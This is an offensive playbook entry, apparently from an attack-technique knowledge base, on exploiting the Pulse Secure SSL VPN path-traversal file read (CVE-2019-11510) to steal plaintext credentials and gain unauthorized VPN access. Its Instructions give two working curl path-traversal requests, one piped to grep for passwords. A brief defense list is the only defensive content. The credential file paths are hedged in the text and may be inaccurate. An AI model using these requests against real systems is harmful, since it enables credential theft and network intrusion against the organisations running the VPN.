---
tags:
  - credential-theft
  - information-disclosure
  - plaintext-credentials
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-exploit-pulse-secure-file-read]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:26:22.454Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8c948981-8b3f-4bec-a3d2-a781f1c29cd0
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---
# Extract-Plaintext-Credentials-via-File-Read

## Summary

This procedure uses the arbitrary file read vulnerability in Pulse Secure SSL VPN to extract plaintext credentials stored insecurely on the filesystem, enabling unauthorized VPN access.

## Description

Pulse Secure stores credentials in cleartext in filesystem locations accessible via the path traversal vuln. Target files include config directories like /var/pulse-secure/ or similar. This builds on the initial file read, leading to authentication in subsequent steps. Prerequisites: Confirmed vuln from prior procedure.

## Requirements

1. Successful exploitation of arbitrary file read
2. Knowledge of credential storage paths (e.g., from reconnaissance)
3. [[tools/curl]] for requests

## Defense

Defensive measures and detection strategies:

- Encrypt or hash stored credentials; avoid plaintext storage
- Apply file system permissions to restrict access to config directories
- Log and alert on file read attempts via IDS/IPS
- Regular vulnerability scanning for CVE-2019-11510

## Objectives

1. Locate and read credential files
2. Extract usable username/password pairs
3. Prepare for VPN authentication

## Instructions

### Step 1: Target Credential Storage Paths

**Context**: Adapt the file read payload to probe known Pulse Secure credential locations.

**Command** ([[commands/curl-exploit-pulse-secure-file-read]]):
```bash
curl -i -k --path-as-is https://target-vpn/dana-na/../dana/html5acc/guacamole/../../../../../../var/pulse-secure/ivman/user?/dana/html5acc/guacamole/
```

> Adjust path to specific files; expected output: Plaintext creds like "user:password".

### Step 2: Parse and Validate Credentials

**Context**: Manually or script parse the output for valid creds.

**Command** ([[commands/curl-exploit-pulse-secure-file-read]]):
```bash
curl -i -k --path-as-is https://target-vpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/pulse-secure.conf?/dana/html5acc/guacamole/ | grep -i pass
```

> Pipe to grep for passwords; expected output: Filtered credential lines.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Credentials In Files]]

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-exploit-pulse-secure-file-read]]

## Tools Used

- [[tools/curl]]

## Tags

- credential-theft
- plaintext-storage
